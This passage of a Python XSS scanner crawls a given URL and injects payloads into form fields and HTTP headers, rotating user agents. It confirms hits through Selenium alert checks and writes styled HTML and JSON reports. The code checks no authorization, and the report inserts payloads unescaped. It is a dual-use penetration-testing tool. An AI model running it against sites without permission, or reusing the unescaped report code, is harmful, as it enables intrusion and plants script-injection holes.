        except Exception as e:
            return False

    def test_forms(self):
        """Test forms for XSS"""
        if not self.forms:
            print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}No forms to test")
            return
        
        print(f"\n{Fore.GREEN}[{Fore.RED}EXPLOIT{Fore.GREEN}] {Fore.WHITE}Testing Forms...")
        
        for form in self.forms:
            print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}Form: {form['action']} {Fore.CYAN}({form['method']})")
            
            for input_field in form['inputs']:
                if input_field['type'] not in ['submit', 'button', 'hidden', 'csrf', 'token']:
                    print(f"{Fore.GREEN}[{Fore.RED}INPUT{Fore.GREEN}] {Fore.WHITE}Testing: {input_field['name']} ({input_field['type']})")
                    
                    # Test with best payloads for each context
                    for context, payloads in self.payloads.items():
                        for payload in payloads[:1]:  # Test best payload per context
                            success = self.test_form_input(form, input_field['name'], payload, context)
                            if success:
                                break
                            time.sleep(self.delay)

    def test_form_input(self, form, input_name, payload, context):
        """Test form input with payload"""
        try:
            form_data = {}
            for input_field in form['inputs']:
                if input_field['name'] == input_name:
                    form_data[input_field['name']] = payload
                else:
                    # Use appropriate default values
                    if 'email' in input_field['name'].lower():
                        form_data[input_field['name']] = 'test@example.com'
                    elif 'password' in input_field['name'].lower():
                        form_data[input_field['name']] = 'password123'
                    elif 'phone' in input_field['name'].lower():
                        form_data[input_field['name']] = '1234567890'
                    else:
                        form_data[input_field['name']] = input_field['value'] or 'test'
            
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Referer': form['base_url'],
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            if form['method'] == 'POST':
                response = self.session.post(form['action'], data=form_data, headers=headers, timeout=self.timeout)
                test_url = form['action']
            else:
                response = self.session.get(form['action'], params=form_data, headers=headers, timeout=self.timeout)
                test_url = form['action'] + '?' + urllib.parse.urlencode(form_data)
            
            self.scan_results['statistics']['total_payloads_tested'] += 1
            
            # Check for XSS
            if self.detect_xss_response(response, payload, context):
                print(f"{Fore.YELLOW}[{Fore.RED}POTENTIAL{Fore.YELLOW}] {Fore.WHITE}XSS reflection in form input {input_name}")
                
                # Verify
                confirmed = False
                if self.driver:
                    confirmed = self.verify_form_with_browser(form, form_data)
                else:
                    confirmed = self.fallback_verification(response, payload)
                
                if confirmed:
                    vulnerability = {
                        'type': 'Reflected XSS',
                        'url': form['action'],
                        'parameter': input_name,
                        'payload': payload,
                        'context': context,
                        'method': form['method'],
                        'confirmed': True,
                        'score': 20,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.found_vulnerabilities.append(vulnerability)
                    self.scan_results['vulnerabilities'].append(vulnerability)
                    self.scan_results['statistics']['confirmed_vulnerabilities'] += 1
                    
                    print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}FORM XSS VULNERABILITY!")
                    print(f"{Fore.GREEN}[{Fore.RED}INPUT{Fore.GREEN}] {Fore.WHITE}{input_name}")
                    print(f"{Fore.GREEN}[{Fore.RED}FORM{Fore.GREEN}] {Fore.WHITE}{form['action']}")
                    print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
                    print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}20/20")
                    
                    if self.driver:
                        self.take_screenshot(test_url, f"xss_form_{input_name}_{len(self.found_vulnerabilities)}")
                    
                    return True
            
            return False
            
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Form test failed: {str(e)[:30]}")
            return False

    def verify_form_with_browser(self, form, form_data):
        """Verify form XSS with browser"""
        if not self.driver:
            return False
        
        try:
            self.driver.get(form['base_url'])
            time.sleep(1)
            
            # Fill and submit form
            for field_name, field_value in form_data.items():
                try:
                    element = self.driver.find_element("name", field_name)
                    element.clear()
                    element.send_keys(field_value)
                except:
                    pass
            
            # Submit form
            try:
                submit_button = self.driver.find_element("css selector", "input[type='submit'], button[type='submit'], button")
                submit_button.click()
            except:
                # Try form submission
                try:
                    form_element = self.driver.find_element("tag name", "form")
                    form_element.submit()
                except:
                    pass
            
            time.sleep(2)
            
            # Check for alert
            try:
                from selenium.webdriver.support.ui import WebDriverWait
                from selenium.webdriver.support import expected_conditions as EC
                
                alert = WebDriverWait(self.driver, 2).until(EC.alert_is_present())
                alert_text = alert.text
                alert.accept()
                
                if self.popup_signature in alert_text:
                    return True
            except:
                pass
            
            # Check page content
            if self.popup_signature in self.driver.page_source:
                return True
            
            return False
            
        except Exception as e:
            return False

    def test_http_headers(self):
        """Test HTTP headers for XSS"""
        print(f"\n{Fore.GREEN}[{Fore.RED}EXPLOIT{Fore.GREEN}] {Fore.WHITE}Testing HTTP Headers...")
        
        test_urls = list(self.crawled_urls)[:3] if self.crawled_urls else [self.target_url]
        
        for test_url in test_urls:
            for header in self.headers_to_test[:5]:  # Test top 5 headers
                print(f"{Fore.GREEN}[{Fore.RED}HEADER{Fore.GREEN}] {Fore.WHITE}Testing: {header} in {test_url}")
                
                for payload in self.payloads['html_context'][:2]:
                    success = self.test_header(test_url, header, payload)
                    if success:
                        break
                    time.sleep(self.delay)

    def test_header(self, url, header_name, payload):
        """Test HTTP header with payload"""
        try:
            headers = {
                'User-Agent': self.get_random_user_agent(),
                header_name: payload,
            }
            
            response = self.session.get(url, headers=headers, timeout=self.timeout)
            self.scan_results['statistics']['total_payloads_tested'] += 1
            
            if self.detect_xss_response(response, payload, 'header'):
                # Headers are harder to verify, use response analysis
                if self.popup_signature in response.text:
                    vulnerability = {
                        'type': 'Header-based XSS',
                        'url': url,
                        'parameter': header_name,
                        'payload': payload,
                        'context': 'header',
                        'method': 'GET',
                        'confirmed': True,
                        'score': 15,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.found_vulnerabilities.append(vulnerability)
                    self.scan_results['vulnerabilities'].append(vulnerability)
                    self.scan_results['statistics']['confirmed_vulnerabilities'] += 1
                    
                    print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}HEADER XSS VULNERABILITY!")
                    print(f"{Fore.GREEN}[{Fore.RED}HEADER{Fore.GREEN}] {Fore.WHITE}{header_name}")
                    print(f"{Fore.GREEN}[{Fore.RED}URL{Fore.GREEN}] {Fore.WHITE}{url}")
                    print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
                    print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}15/20")
                    
                    return True
            
            return False
            
        except Exception as e:
            return False

    def take_screenshot(self, url, filename):
        """Take screenshot of vulnerable page"""
        if not self.driver:
            return None
        
        try:
            self.driver.get(url)
            time.sleep(2)
            
            screenshot_dir = "screenshots"
            if not os.path.exists(screenshot_dir):
                os.makedirs(screenshot_dir)
            
            screenshot_path = os.path.join(screenshot_dir, f"{filename}.png")
            self.driver.save_screenshot(screenshot_path)
            
            print(f"{Fore.GREEN}[{Fore.RED}SCREENSHOT{Fore.GREEN}] {Fore.WHITE}Saved: {screenshot_path}")
            return screenshot_path
            
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Screenshot failed: {e}")
            return None

    def generate_html_report(self):
        """Generate enhanced HTML report"""
        html_template = f"""
<!DOCTYPE html>
<html dir="rtl" lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Scanner Report - {self.target_url}</title>
    <style>
        body {{
            font-family: 'Courier New', 'Monaco', monospace;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
            color: #00ff00;
            min-height: 100vh;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #00ff00;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
            overflow: hidden;
        }}
        .header {{
            background: linear-gradient(135deg, #001100, #003300);
            color: #00ff00;
            padding: 30px;
            text-align: center;
            border-bottom: 2px solid #00ff00;
            text-shadow: 0 0 10px #00ff00;
        }}
        .matrix-text {{
            font-family: 'Courier New', monospace;
            font-weight: bold;
            animation: glow 2s ease-in-out infinite alternate;
        }}
        @keyframes glow {{
            from {{ text-shadow: 0 0 5px #00ff00; }}
            to {{ text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }}
        }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 30px;
            background: rgba(0, 20, 0, 0.5);
        }}
        .stat-card {{
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #00ff00;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
        }}
        .stat-number {{
            font-size: 2em;
            font-weight: bold;
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000;
        }}
        .vulnerabilities {{
            padding: 30px;
        }}
        .vuln-card {{
            background: rgba(20, 0, 0, 0.8);
            border: 1px solid #ff0000;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border-left: 5px solid #ff0000;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.2);
        }}
        .vuln-confirmed {{
            background: rgba(0, 20, 0, 0.8);
            border-color: #00ff00;
            border-left-color: #00ff00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
        }}
        .payload {{
            background: #000;
            color: #00ff00;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            margin: 10px 0;
            overflow-x: auto;
            border: 1px solid #00ff00;
            box-shadow: inset 0 0 10px rgba(0, 255, 0, 0.1);
        }}
        .score {{
            display: inline-block;
            background: linear-gradient(45deg, #ff0000, #ff6600);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-weight: bold;
            text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
        }}
        .timestamp {{
            color: #888;
            font-size: 0.9em;
            font-family: 'Courier New', monospace;
        }}
        .hacker-text {{
            color: #00ff00;
            font-family: 'Courier New', monospace;
            text-shadow: 0 0 5px #00ff00;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="matrix-text">XSS SCANNER INTELLIGENCE REPORT</h1>
            <h2 class="hacker-text">{self.target_url}</h2>
            <p class="hacker-text">SCAN TIMESTAMP: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p class="hacker-text">CLASSIFICATION: {"VULNERABLE" if self.found_vulnerabilities else "SECURE"}</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{self.scan_results['statistics']['total_urls_crawled']}</div>
                <div class="hacker-text">URLS CRAWLED</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.scan_results['statistics']['total_forms_found']}</div>
                <div class="hacker-text">FORMS DISCOVERED</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.scan_results['statistics']['total_payloads_tested']}</div>
                <div class="hacker-text">PAYLOADS TESTED</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.scan_results['statistics']['confirmed_vulnerabilities']}</div>
                <div class="hacker-text">VULNERABILITIES</div>
            </div>
        </div>
        
        <div class="vulnerabilities">
            <h2 class="hacker-text">VULNERABILITY INTELLIGENCE</h2>
"""
        
        if not self.found_vulnerabilities:
            html_template += '<p class="hacker-text">TARGET APPEARS SECURE - NO CONFIRMED VULNERABILITIES</p>'
        else:
            for i, vuln in enumerate(self.found_vulnerabilities, 1):
                confirmed_class = "vuln-confirmed" if vuln['confirmed'] else ""
                html_template += f"""
            <div class="vuln-card {confirmed_class}">
                <h3 class="hacker-text">VULNERABILITY #{i} - {vuln['type']}</h3>
                <p><strong class="hacker-text">URL:</strong> {vuln['url']}</p>
                <p><strong class="hacker-text">PARAMETER:</strong> {vuln['parameter']}</p>
                <p><strong class="hacker-text">METHOD:</strong> {vuln['method']}</p>
                <p><strong class="hacker-text">CONTEXT:</strong> {vuln['context']}</p>
                <p><strong class="hacker-text">STATUS:</strong> {'CONFIRMED' if vuln['confirmed'] else 'UNCONFIRMED'}</p>
                <p><strong class="hacker-text">SCORE:</strong> <span class="score">{vuln['score']}/20</span></p>
                <p><strong class="hacker-text">PAYLOAD:</strong></p>
                <div class="payload">{vuln['payload']}</div>
                <p class="timestamp">DISCOVERED: {vuln['timestamp']}</p>
            </div>
"""
        
        html_template += """
        </div>
    </div>
</body>
</html>
"""
        
        report_filename = f"xss_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(html_template)
        
        print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}HTML report generated: {report_filename}")
        return report_filename

    def generate_json_report(self):
        """Generate JSON report"""
        self.scan_results['end_time'] = datetime.now().isoformat()
        
        report_filename = f"xss_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(self.scan_results, f, indent=2, ensure_ascii=False)
        
        print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}JSON report generated: {report_filename}")
        return report_filename

    def run_scan(self):
        """Run the complete enhanced XSS scan"""
        self.print_banner()
        
        try:
            # Enhanced connectivity test
            print(f"{Fore.GREEN}[{Fore.RED}INIT{Fore.GREEN}] {Fore.WHITE}Performing target analysis...")
            if not self.test_connectivity():
                print(f"{Fore.RED}[{Fore.YELLOW}ABORT{Fore.RED}] {Fore.WHITE}Cannot establish connection to target")
                print(f"{Fore.YELLOW}[{Fore.RED}TIP{Fore.YELLOW}] {Fore.WHITE}Check: 1) Internet connection 2) Target URL 3) Firewall settings")
                return
            
            # Phase 1: Reconnaissance
            self.crawl_website()
            
            # Phase 2: Exploitation
            self.perform_testing()
            
            # Generate reports
            print(f"\n{Fore.YELLOW}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}GENERATING INTELLIGENCE REPORTS")
            print(f"{Fore.YELLOW}{'='*70}")
            
            html_report = self.generate_html_report()
            json_report = self.generate_json_report()
            
            # Final results with Matrix style
            print(f"\n{Fore.GREEN}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}RESULTS{Fore.GREEN}] {Fore.WHITE}MISSION COMPLETE - FINAL INTELLIGENCE")
            print(f"{Fore.GREEN}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}{self.target_url}")
            print(f"{Fore.GREEN}[{Fore.RED}CRAWLED{Fore.GREEN}] {Fore.WHITE}{self.scan_results['statistics']['total_urls_crawled']} URLs")
            print(f"{Fore.GREEN}[{Fore.RED}FORMS{Fore.GREEN}] {Fore.WHITE}{self.scan_results['statistics']['total_forms_found']} forms")
            print(f"{Fore.GREEN}[{Fore.RED}PAYLOADS{Fore.GREEN}] {Fore.WHITE}{self.scan_results['statistics']['total_payloads_tested']} payloads tested")
            print(f"{Fore.GREEN}[{Fore.RED}VULNS{Fore.GREEN}] {Fore.WHITE}{self.scan_results['statistics']['confirmed_vulnerabilities']} confirmed")
            
            if self.found_vulnerabilities:
                print(f"\n{Fore.RED}[{Fore.GREEN}CRITICAL{Fore.RED}] {Fore.WHITE}VULNERABILITIES CONFIRMED:")
                for i, vuln in enumerate(self.found_vulnerabilities, 1):
                    print(f"{Fore.RED}[{Fore.GREEN}{i}{Fore.RED}] {Fore.WHITE}{vuln['type']} - {vuln['parameter']} {Fore.GREEN}(Score: {vuln['score']}/20)")
                    print(f"    {Fore.CYAN}URL: {vuln['url']}")
                    print(f"    {Fore.CYAN}Payload: {vuln['payload']}")
            else:
                print(f"\n{Fore.GREEN}[{Fore.RED}SECURE{Fore.GREEN}] {Fore.WHITE}No confirmed vulnerabilities - target appears secure")
            
            print(f"\n{Fore.GREEN}[{Fore.RED}COMPLETE{Fore.GREEN}] {Fore.WHITE}Scan completed successfully")
            print(f"{Fore.GREEN}[{Fore.RED}FILES{Fore.GREEN}] {Fore.WHITE}Reports: {html_report}, {json_report}")
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[{Fore.RED}ABORT{Fore.YELLOW}] {Fore.WHITE}Scan interrupted by user")
        except Exception as e:
            print(f"\n{Fore.RED}[{Fore.YELLOW}FATAL{Fore.RED}] {Fore.WHITE}Scan failed: {e}")
        finally:
            if self.driver:
                self.driver.quit()
                print(f"{Fore.GREEN}[{Fore.RED}CLEANUP{Fore.GREEN}] {Fore.WHITE}Browser driver closed")

def main():
    parser = argparse.ArgumentParser(
        description='Advanced XSS Scanner v2.0 - Professional XSS Detection Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python xss_scanner_v2.py -u https://example.com
  python xss_scanner_v2.py -u https://example.com -d 5 -t 10 --delay 2 --timeout 20
  python xss_scanner_v2.py -u http://testphp.vulnweb.com
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-d', '--depth', type=int, default=3, help='Maximum crawl depth (default: 3)')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between requests (default: 1.0)')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout (default: 15)')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[ERROR] URL must start with http:// or https://")
        sys.exit(1)
    
    # Initialize and run scanner
    scanner = AdvancedXSSScanner(
        target_url=args.url,
        max_depth=args.depth,
        delay=args.delay,
        threads=args.threads,
        timeout=args.timeout
    )
    
    scanner.run_scan()

if __name__ == "__main__":
    main()